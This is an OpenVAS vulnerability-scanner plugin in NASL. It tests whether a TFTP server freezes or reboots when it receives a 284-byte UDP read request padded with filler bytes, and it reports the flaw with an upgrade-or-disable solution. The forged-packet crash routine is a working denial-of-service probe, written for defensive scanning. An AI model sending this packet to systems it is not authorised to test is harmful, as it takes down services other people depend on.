# OpenVAS Vulnerability Test
# $Id: tftpd_small_overflow.nasl 17 2013-10-27 14:01:43Z jan $
# Description: TFTPD small overflow
#
# Authors:
# Josh Zlatin-Amishav <josh@tkos.co.il>
#
# Copyright:
# Copyright (C) 2005 Josh Zlatin-Amishav
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The remote TFTP server dies when it receives a small UDP 
 datagram. A malicious user may use this flaw to disable your server.";

tag_solution = "Upgrade your software, or disable this service";

# This plugin is just a very slightly modified version of tftpd_overflow.nasl

if(description)
{
 script_id(18493);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_tag(name:"cvss_base", value:"7.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
 script_tag(name:"risk_factor", value:"High");
 script_bugtraq_id(13908);
 script_name( "TFTPD small overflow");
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;

 script_description( desc);
 
 script_summary( "Crashes TFTPD with a small UDP datagram");

 script_category(ACT_KILL_HOST);
 
 script_copyright("Copyright (C) 2005 Josh Zlatin-Amishav");
 script_family( "Gain a shell remotely");
 script_require_keys("Services/udp/tftp");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

#
include('global_settings.inc');
include('dump.inc');

if(islocalhost()) exit(0);	# ?
if(TARGET_IS_IPV6())exit(0);

# This function cannot yet send UDP packets bigger than the MTU
function tftp_ping(port, huge)
{
 local_var	req, rep, sport, ip, u, filter, data, i;

 debug_print('tftp_ping: huge=', huge, '\n');

 if (huge)
  req = '\x00\x01'+crap(huge)+'\0netascii\0';
 else
  req = '\x00\x01OpenVAS'+rand()+'\0netascii\0';

 sport = rand() % 64512 + 1024;
 ip = forge_ip_packet(ip_hl : 5, ip_v: 4,  ip_tos:0, 
	ip_len:20, ip_off:0, ip_ttl:64, ip_p:IPPROTO_UDP,
	ip_src: this_host());
		     
 u = forge_udp_packet(ip:ip, uh_sport: sport, uh_dport:port, uh_ulen: 8 + strlen(req), data:req);

 filter = 'udp and dst port ' + sport + ' and src host ' + get_host_ip() + ' and udp[8:1]=0x00';

 data = NULL;
 for (i = 0; i < 2; i ++)	# Try twice
 {
  rep = send_packet(u, pcap_active:TRUE, pcap_filter:filter);
  if(rep)
  {
   if (debug_level > 2) dump(ddata: rep, dtitle: 'TFTP (IP)');
   data = get_udp_element(udp: rep, element:"data");
   if (debug_level > 1) dump(ddata: data, dtitle: 'TFTP (UDP)');
   if (data[0] == '\0' && (data[1] == '\x03' || data[1] == '\x05'))
   {
    debug_print('tftp_ping(port=', port, ',huge=', huge, ') succeeded\n');
    return TRUE;
   }
  }
 }
 debug_print('tftp_ping(port=', port, ',huge=', huge, ') failed\n');
 return FALSE;
}

# 
port = get_kb_item('Services/udp/tftp');
if (! port) port = 69;
if (! tftp_ping(port: port)) exit(0);

start_denial();

tftp_ping(port: port, huge: 284);

# I'll check this first, in case the device reboots
tftpalive = tftp_ping(port: port);
alive = end_denial();

if (! alive)
  security_hole(port: port, proto: "udp", data: 
"The remote device freezes or reboots when a UDP datagram of 284 bytes in length
is sent to the TFTP server.

A malicious user may use this flaw to disable this device.

Solution: Upgrade your software, or disable TFTP
Risk Factor : High");
else
 if (! tftpalive)
  security_hole(port: port, proto: "udp");

if (! alive || ! tftpalive)
 set_kb_item(name: 'tftp/'+port+'/smalloverflow', value: TRUE);
